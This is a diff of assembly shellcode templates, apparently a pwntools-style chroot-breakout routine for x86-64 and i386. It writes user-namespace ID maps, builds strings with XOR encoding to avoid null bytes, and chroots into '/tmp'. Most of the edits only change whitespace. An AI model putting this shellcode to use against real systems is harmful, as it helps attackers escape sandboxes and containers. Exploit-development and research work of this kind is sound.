@@ -38,7 +38,6 @@ if is64:
         xor	eax, eax
         ret
 
-
     clone	:
         sub	rsi, 0x10
         mov	[rsi+8], rcx
@@ -51,7 +50,6 @@ if is64:
         syscall
         ret
 
-
     waitpid	:
         xor	r10, r10
         mov	rax, r10
@@ -59,13 +57,11 @@ if is64:
         syscall
         ret
 
-
     open	:
         xor	rax, rax
         mov	al, 2
         syscall
         ret
-
 
     write	:
         xor	rax, rax
@@ -73,20 +69,17 @@ if is64:
         syscall
         ret
 
-
     close	:
         xor	rax, rax
         mov	al, 3
         syscall
         ret
 
-
     chroot	:
         xor	rax, rax
         mov	al, 0x0A1
         syscall
         ret
-
 
     exit	:
         xor	rax, rax
@@ -119,7 +112,8 @@ if is64:
         mov	esi, 1
         call	open
         mov r10,rax
-                        /* push '0 0 1' */
+        
+        /* push '0 0 1' */
         mov rax, 0x101010101010101
         push rax
         mov rax, 0x101010101010101 ^ 0x3120302030
@@ -133,7 +127,8 @@ if is64:
         call	write
         mov	edi, ebx
         call	close
-                /* push '/proc/self/gid_map' */
+        
+        /* push '/proc/self/gid_map' */
         push 0x1010101 ^ 0x7061
         xor dword ptr [rsp], 0x1010101
         mov rax, 0x6d5f6469672f666c
@@ -144,7 +139,7 @@ if is64:
         mov	rdi, rsp
         mov	esi, 1
         call	open
-            /* push '0 0 1' */
+        /* push '0 0 1' */
         mov r10,rax
         mov rax, 0x101010101010101
         push rax
@@ -159,7 +154,8 @@ if is64:
         call	write
         mov	edi, ebx
         call	close
-            /* push './' */
+        
+        /* push '/tmp\x00' */
         push 0x706d742f
 
         mov	rdi, rsp
@@ -215,13 +211,11 @@ else:
         int 0x80
         ret
 
-
     write	:
         xor	eax, eax
         mov	al, 4
         int 0x80
         ret
-
 
     close	:
         xor	eax, eax
@@ -229,20 +223,17 @@ else:
         int 0x80
         ret
 
-
     chroot	:
         xor	eax, eax
         mov	al, 61
         int 0x80
         ret
 
-
     exit	:
         xor	eax, eax
         inc eax
         int 0x80
         ret
-
 
     mmap	:
         mov eax,0xc0
@@ -296,10 +287,11 @@ else:
         call	write
         call	close
 
-        /* push './\\x00' */
-        push 0x1010101
-        xor dword ptr [esp], 0x1012e2f
-
+        /* push '/tmp\\x00' */
+        push 1
+        dec byte ptr [esp]
+        push 0x706d742f
+        
         mov	ebx, esp
         call	chroot
         test	eax, eax
